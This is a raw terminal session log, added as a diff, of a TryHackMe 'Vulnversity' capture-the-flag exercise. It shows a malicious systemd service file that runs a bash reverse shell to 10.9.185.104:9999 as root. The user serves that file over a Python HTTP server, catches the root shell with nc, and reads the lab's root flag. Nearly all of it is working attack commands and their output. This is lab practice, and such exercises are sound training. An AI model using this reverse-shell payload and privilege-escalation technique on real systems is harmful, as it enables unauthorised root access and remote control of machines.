@@ -1,0 +1,66 @@
+Script started on 2020-11-02 21:40:11-03:00 [TERM="xterm-256color" TTY="/dev/pts/1" COLUMNS="166" LINES="39"]
+]0;joaof@Pentest: ~/TryJao/TryHackMe/Vulnversity[1;34mjoaof@Pentest[00m:[1;32m~/TryJao/TryHackMe/Vulnversity[00m$ cat [K[Kt root.service 
+[Unit]
+Description=roooooooooot
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.9.185.104/9999 0>&1'
+
+[Install]
+WantedBy=multi-user.target
+
+
+]0;joaof@Pentest: ~/TryJao/TryHackMe/Vulnversity[1;34mjoaof@Pentest[00m:[1;32m~/TryJao/TryHackMe/Vulnversity[00m$ python /[K-m SimpleTHH[K[K[KHTTPServer 808[K00
+Serving HTTP on 0.0.0.0 port 8000 ...
+10.10.212.178 - - [02/Nov/2020 21:42:00] "GET /root.service HTTP/1.1" 200 -
+^CTraceback (most recent call last):
+  File "/usr/lib/python2.7/runpy.py", line 174, in _run_module_as_main
+    "__main__", fname, loader, pkg_name)
+  File "/usr/lib/python2.7/runpy.py", line 72, in _run_code
+    exec code in run_globals
+  File "/usr/lib/python2.7/SimpleHTTPServer.py", line 235, in <module>
+    test()
+  File "/usr/lib/python2.7/SimpleHTTPServer.py", line 231, in test
+    BaseHTTPServer.test(HandlerClass, ServerClass)
+  File "/usr/lib/python2.7/BaseHTTPServer.py", line 610, in test
+    httpd.serve_forever()
+  File "/usr/lib/python2.7/SocketServer.py", line 231, in serve_forever
+    poll_interval)
+  File "/usr/lib/python2.7/SocketServer.py", line 150, in _eintr_retry
+    return func(*args)
+KeyboardInterrupt
+]0;joaof@Pentest: ~/TryJao/TryHackMe/Vulnversity[1;34mjoaof@Pentest[00m:[1;32m~/TryJao/TryHackMe/Vulnversity[00m$ 
+]0;joaof@Pentest: ~/TryJao/TryHackMe/Vulnversity[1;34mjoaof@Pentest[00m:[1;32m~/TryJao/TryHackMe/Vulnversity[00m$ sudo nc -vnlp 9999
+[sudo] senha para joaof: 
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::9999
+Ncat: Listening on 0.0.0.0:9999
+Ncat: Connection from 10.10.212.178.
+Ncat: Connection from 10.10.212.178:59828.
+bash: cannot set terminal process group (1820): Inappropriate ioctl for device
+bash: no job control in this shell
+root@vulnuniversity:/# 
+
+root@vulnuniversity:/# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@vulnuniversity:/# 
+
+root@vulnuniversity:/# cd /root]
+cd /root]
+bash: cd: /root]: No such file or directory
+root@vulnuniversity:/# cd /root/
+cd /root/
+root@vulnuniversity:~# ls
+ls
+root.txt
+root@vulnuniversity:~# cd  cat oo  root.txt
+cat root.txt
+a58ff8579f0a9270368d33a9966c7fd5
+root@vulnuniversity:~# ^C
+]0;joaof@Pentest: ~/TryJao/TryHackMe/Vulnversity[1;34mjoaof@Pentest[00m:[1;32m~/TryJao/TryHackMe/Vulnversity[00m$ exit
+exit
+
+Script done on 2020-11-02 21:51:09-03:00 [COMMAND_EXIT_CODE="130"]
